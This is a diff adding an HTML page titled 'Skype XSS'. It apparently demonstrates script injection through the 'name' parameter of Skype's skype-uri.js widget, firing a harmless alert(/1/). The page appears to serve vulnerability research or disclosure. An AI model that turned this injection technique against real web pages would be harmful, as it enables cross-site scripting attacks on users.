@@ -1,0 +1,41 @@
+<html>
+
+
+<head>
+
+  <title>Skype XSS</title>
+
+  <script type="text/javascript">
+    function onload() {
+      alert(/1/)
+    }
+  </script>
+
+  <script type="text/javascript" src="http://www.skypeassets.com/i/scom/js/skype-uri.js"></script>
+</head>
+<!--http://www.skypeassets.com/i/scom/js/skype-uri.js-->
+
+<body>
+
+
+  <div id="genSkypeCall" style="width:20%; background-color:#0094ff">
+
+    <b>test</b>
+    <script type="text/javascript">
+      Skype.ui({
+        name: onload(),
+        element: "genSkypeCall",
+        participants: ["echo123"],
+        imageSize: 32,
+        imageColor: "skype"
+      });
+    </script>
+  </div>
+  <p>
+    <i>Refference <a href= https://msdn.microsoft.com/en-us/library/office/dn745883.aspx</a>https://msdn.microsoft.com/en-us/library/office/dn745883.aspx</i>
+  </p>
+
+  <!--<a href="skype:skype.test.user.1;skype.test.user.2?chat&topic=Quantum%20Mechanics%20101">Call</a>-->
+</body>
+
+</html>
